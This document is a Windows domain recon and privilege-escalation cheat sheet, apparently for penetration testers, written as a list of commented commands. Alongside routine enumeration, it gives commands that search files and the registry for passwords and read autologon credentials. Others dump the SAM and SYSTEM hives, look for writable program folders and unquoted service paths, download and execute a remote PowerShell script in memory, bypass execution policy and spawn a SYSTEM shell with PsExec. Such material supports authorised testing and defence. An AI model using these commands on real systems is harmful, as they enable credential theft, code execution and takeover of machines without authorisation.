#This cheatsheet is for recon of a windows environnement starting with a simple computer member of the domain.
#get iP configuration
ipconfig /all 

#check existing route 
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex

#check local firewall state 
netsh firewall show state
Get-NetFirewallProfile


#check Arp Cache 
arp -a
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State


#Get account Information
whoami /all

#get information about the system
systeminfo

#Check Update :
wmic qfe list brief
wmic qfe get Caption,Description,HotFixID,InstalledOn
#Check Hosts file 
get-content C:\WINDOWS\System32\drivers\etc\hosts

#check privilege 
whoami /priv

#get all local user
net user
Get-LocalUser | ft Name,Enabled,LastLogon

#get all local group
net localgroup
Get-LocalGroup | ft Name


#check member of local group
net localgroup administrateurs

#get member of domain admin groups
net group /domain "admins du domaine"
net group /domain "Domain admins"

#get intel of a specific domain User 
net user /DOMAIN administrator

#Identify all domain controller 
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainControllers

#Identify DnS server, it many case in WIndow Env it's a domain Controller
Get-DnsClientServerAddress -AddressFamily IPv4 | ft

#check password in file ;)
findstr /si password *.txt
findstr /si password *.xml
findstr /si password *.ini
findstr /si password *.conf


#check password in all files
findstr /spin "password" *.*


#Get Applied GPO  
gpresult /h GPO.html /f

#identify network share 
net use

#list local share
Get-SmbShare
net share

#Get all share of remote server
net view \\servernameorIP

#Check auto logon credential

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon' | select "Default*"


#Acces SAM
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system


#Check Right to identify leverafe for privesc
icacls "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "Everyone"
icacls "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "tout le monde"
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(F)" | findstr "Everyone"
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(F)" | findstr "tout le monde"

icacls "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users"
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users" 


icacls "C:\Program Files\*" 2>nul | findstr "(M)" | findstr "Everyone"
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(M)" | findstr "Everyone"

icacls "C:\Program Files\*" 2>nul | findstr "(M)" | findstr "tout le monde"
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(M)" | findstr "tout le monde"

icacls "C:\Program Files\*" 2>nul | findstr "(M)" | findstr "BUILTIN\Users" 
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(M)" | findstr "BUILTIN\Users" 


#List ScheduledTask

schtasks /query /fo LIST 2>nul | findstr TaskName
dir C:\windows\tasks
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State,

#List service where the executable files is not in C:\Windows 
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.PathName -notlike "C:\Windows*" } | select PathName,DisplayName,Name

#List Unquoted service Path
wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
#check password in regigistre
reg query HKCU /f password /t REG_SZ /s
reg query HKLM /f password /t REG_SZ /s 

#PowerShell One-Line Script Execution in Memory
IEX(New-Object Net.WebClient).downloadString('http://server/script.ps1')

#powershell bypass execution policy
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1


#Powershell identify server 2003 in the current domain 
([adsisearcher]'(OperatingSystem=Windows Server 2003*)').FindAll()

#Powershell identify all Window in the current 
([adsisearcher]'(OperatingSystem=Windows*)').FindAll()

#Psexec to run a shell as system
 PSEXEC -i -s -d CMD

#Check cpassword in SYSVOL to identify 
findstr /si cpassword *.xml

#dump sam 

reg save hklm\sam sam.hiv
reg save hklm\system sys.hiv
#some other interessing files
c:\sysprep.inf
c:\sysprep\sysprep.xml
c:\unattend.xml
%WINDIR%\Panther\Unattend\Unattended.xml
%WINDIR%\Panther\Unattended.xml

dir c:\*vnc.ini /s /b
dir c:\*ultravnc.ini /s /b 
dir c:\ /s /b | findstr /si *vnc.ini
